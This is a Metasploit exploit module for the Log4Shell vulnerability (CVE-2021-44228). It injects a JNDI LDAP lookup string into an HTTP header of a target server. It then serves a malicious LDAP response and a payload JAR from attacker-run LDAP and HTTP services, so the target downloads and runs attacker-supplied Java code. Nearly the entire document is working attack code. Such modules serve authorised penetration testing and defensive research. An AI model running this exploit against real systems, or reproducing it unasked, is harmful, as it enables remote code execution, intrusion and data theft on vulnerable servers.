##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##
class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking
  include Msf::Exploit::Java
  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::Remote::LDAP::Server
  def initialize
    super(
      'Name' => 'Log4Shell HTTP Header Injection',
      'Description' => %q{
        Send vulnerable header with JNDI injected URL from which the JVM will acquire
        and execute attacker controlled data.
      },
      'Author' => [
        'Michael Schierl', # The know-how, tons of the originating code, all of the Jedi stuff
        'RageLtMan <rageltman[at]sempervictus>' # Flippper-fisting of keyboard for some infra
      ],
      'References' => [
        [ 'CVE', '2021-44228' ],
      ],
      'DisclosureDate' => '2021-12-09',
      'License' => MSF_LICENSE,
      'DefaultOptions' => {
        'SRVPORT' => 389
      },
      'Platform' => 'java',
      'Arch' => [ARCH_JAVA],
      'Targets' => [
        ['Automatic', {}]
      ],
      'Notes' => {
        'Stability' => [CRASH_SAFE],
        'SideEffects' => [IOC_IN_LOGS],
        'AKA' => ['Log4Shell', 'LogJam'],
        'Reliability' => [REPEATABLE_SESSION]
      }
    )
    register_options([
      OptString.new('HTTP_METHOD', [ true, 'The HTTP method to use', 'GET' ]),
      OptString.new('TARGETURI', [ true, 'The URI to scan', '/']),
      OptString.new('HTTP_HEADER', [ true, 'The header to inject', 'X-Api-Version']),
      OptPort.new('HTTPPORT',  [true, "The HTTP server port", 8080]),
      OptBool.new('LDAP_AUTH_BYPASS', [true, 'Ignore LDAP client authentication', true]),
      OptBool.new('REMOTE_LOAD', [true, 'Load payload from MSF HTTP service', true]),
    ])
  end
  def jndi_string
    "${jndi:ldap://#{datastore['SRVHOST']}:#{datastore['SRVPORT']}/dc=#{Rex::Text.rand_text_alpha_lower(6)},dc=#{Rex::Text.rand_text_alpha_lower(3)}}"
  end
  def resource_url_string
    "http#{datastore['SSL'] ? 's' : ''}://#{datastore['SRVHOST']}:#{datastore['HTTPPORT']}#{resource_uri}"
  end
  #
  # Use Ruby Java bridge to create a Java-natively-serialized object
  #
  # @return [String] Marshalled serialized byteArray of the loader class
  def byte_array_payload(pay_class = "metasploit.PayloadFactory")
    jar = generate_payload.encoded_jar
    serialized_class_from_jar(jar, pay_class)
  end
  #
  # Insert PayloadFactory in Java payload JAR
  #
  # @param jar [Rex::Zip::Jar] payload JAR to update
  # @return [Rex::Zip::Jar] updated payload JAR
  def inject_jar_payload_factory(jar = generate_payload.encoded_jar )
    # From exploits/multi/browser/java_rhino - should probably go to lib
    paths = [
      [ "metasploit/PayloadFactory.class" ]
    ]
    paths.each do |path|
      1.upto(path.length - 1) do |idx|
        full = path[0,idx].join("/") + "/"
        jar.add_file(full, '') unless jar.entries.map(&:name).include?(full)
      end
      File.open(File.join( Msf::Config.data_directory, "exploits", "CVE-2021-44228", path ), "rb") do |fd|
        data = fd.read(fd.stat.size)
        jar.add_file(path.join("/"), data)
      end
    end
    jar
  end
  #
  # Generate and serialize the payload as an LDAP search respnse
  #
  # @param msg_id [Integer] LDAP message identifier
  # @param base_dn [Sting] LDAP distinguished name
  #
  # @return [Array] packed BER sequence
  def serialized_payload(msg_id, base_dn, pay_class = "metasploit.PayloadFactory")
    if datastore['REMOTE_LOAD']
      print_good(resource_url_string)
      attrs  = [
        [ "javaClassName".to_ber, [pay_class.to_ber].to_ber_set ].to_ber_sequence,
        [ "javaFactory".to_ber, [pay_class.to_ber].to_ber_set ].to_ber_sequence,
        [ "objectClass".to_ber, ["javaNamingReference".to_ber].to_ber_set ].to_ber_sequence,
        [ "javaCodebase".to_ber, [resource_url_string.to_ber].to_ber_set ].to_ber_sequence,
      ]
    else
      attrs  = [
        [ "javaClassName".to_ber, [pay_class.to_ber].to_ber_set ].to_ber_sequence,
        [ "javaSerializedData".to_ber, [byte_array_payload(pay_class).to_ber].to_ber_set ].to_ber_sequence
      ]
    end
    appseq = [
      base_dn.to_ber,
      attrs.to_ber_sequence
    ].to_ber_appsequence(Net::LDAP::PDU::SearchReturnedData)
    [ msg_id.to_ber, appseq ].to_ber_sequence
  end
  ## LDAP service callbacks
  #
  # Handle incoming requests via service mixin
  #
  def on_dispatch_request(client, data)
    return if data.strip.empty?
    data.extend(Net::BER::Extensions::String)
    begin
      pdu = Net::LDAP::PDU.new(data.read_ber!(Net::LDAP::AsnSyntax))
      vprint_status("LDAP request data remaining: #{data}") unless data.empty?
      resp = case pdu.app_tag
             when Net::LDAP::PDU::BindRequest # bind request
               client.authenticated = true
               service.encode_ldap_response(
                 pdu.message_id,
                 Net::LDAP::ResultCodeSuccess,
                 '',
                 '',
                 Net::LDAP::PDU::BindResult
               )
             when Net::LDAP::PDU::SearchRequest # search request
               if client.authenticated || datastore['LDAP_AUTH_BYPASS']
                 client.write(serialized_payload(pdu.message_id, pdu.search_parameters[:base_object]))
                 service.encode_ldap_response(pdu.message_id, Net::LDAP::ResultCodeSuccess, '', 'Search success', Net::LDAP::PDU::SearchResult)
               else
                 service.encode_ldap_response(pdu.message_i, 50, '', 'Not authenticated', Net::LDAP::PDU::SearchResult)
               end
             else
               vprint_status("Client sent unexpected request #{pdu.app_tag}")
               client.close
             end
      resp.nil? ? client.close : on_send_response(client, resp)
    rescue StandardError => e
      print_error("Failed to handle LDAP request due to #{e}")
      client.close
    end
    resp
  end
  ## HTTP service callbacks
  #
  # Handle HTTP requets and responses
  #
  def on_request_uri(cli, request)
    agent = request.headers['User-Agent']
    pay  = regenerate_payload(cli)
    jar  = inject_jar_payload_factory(pay.encoded_jar)
    send_response(cli, 200, 'OK', jar)
  end
  #
  # Create an HTTP response and then send it
  #
  def send_response(cli, code, message='OK', html='')
    proto = Rex::Proto::Http::DefaultProtocol
    res = Rex::Proto::Http::Response.new(code, message, proto)
    res['Content-Type'] = 'application/java-archive'
    res.body = html
    cli.send_response(res)
  end
  def exploit
    # LDAP service
    start_service
    # HTTP request initiator
    send_request_raw(
      'uri' => normalize_uri(target_uri),
      'method' => datastore['HTTP_METHOD'],
      'headers' => { datastore['HTTP_HEADER'] => jndi_string }
    )
    # HTTP service
    start_http_service
  ensure
    cleanup
  end
  #
  # Kill HTTP & LDAP services (shut them down and clear resources)
  #
  def cleanup
    super
    # Clean and stop HTTP server
    begin
      @http_service.remove_resource(datastore['URIPATH'])
      @http_service.deref
      @http_service.stop
      @http_service.close
      @http_service = nil
    rescue
    end
  end
private
  # Boilerplate HTTP service code
  #
  # Returns the configured (or random, if not configured) URI path
  #
  def resource_uri
    path = datastore['URIPATH'] || rand_text_alphanumeric(8+rand(8)) + '.jar'
    path = '/' + path if path !~ /^\//
    datastore['URIPATH'] = path
    return path
  end
  #
  # Handle the HTTP request and return a response.  Code borrorwed from:
  # msf/core/exploit/http/server.rb
  #
  def start_http_service(opts={})
    comm = datastore['ListenerComm']
    if (comm.to_s == "local")
      comm = ::Rex::Socket::Comm::Local
    else
      comm = nil
    end
    # Default the server host / port
    opts = {
      'ServerHost' => datastore['SRVHOST'],
      'ServerPort' => datastore['HTTPPORT'],
      'Comm'       => comm
    }.update(opts)
    # Start a new HTTP server
    @http_service = Rex::ServiceManager.start(
      Rex::Proto::Http::Server,
      opts['ServerPort'].to_i,
      opts['ServerHost'],
      datastore['SSL'],
      {
        'Msf'        => framework,
        'MsfExploit' => self,
      },
      opts['Comm'],
      datastore['SSLCert']
    )
    @http_service.server_name = datastore['HTTP::server_name']
    # Default the procedure of the URI to on_request_uri if one isn't
    # provided.
    uopts = {
      'Proc' => Proc.new { |cli, req|
          on_request_uri(cli, req)
        },
      'Path' => resource_uri
    }.update(opts['Uri'] || {})
    proto = (datastore["SSL"] ? "https" : "http")
    print_status("Using URL: #{proto}://#{opts['ServerHost']}:#{opts['ServerPort']}#{uopts['Path']}")
    if (opts['ServerHost'] == '0.0.0.0')
      print_status(" Local IP: #{proto}://#{Rex::Socket.source_address('1.2.3.4')}:#{opts['ServerPort']}#{uopts['Path']}")
    end
    # Add path to resource
    @service_path = uopts['Path']
    @http_service.add_resource(uopts['Path'], uopts)
    # As long as we have the http_service object, we will keep the ftp server alive
    while @http_service
      select(nil, nil, nil, 1)
    end
  end
end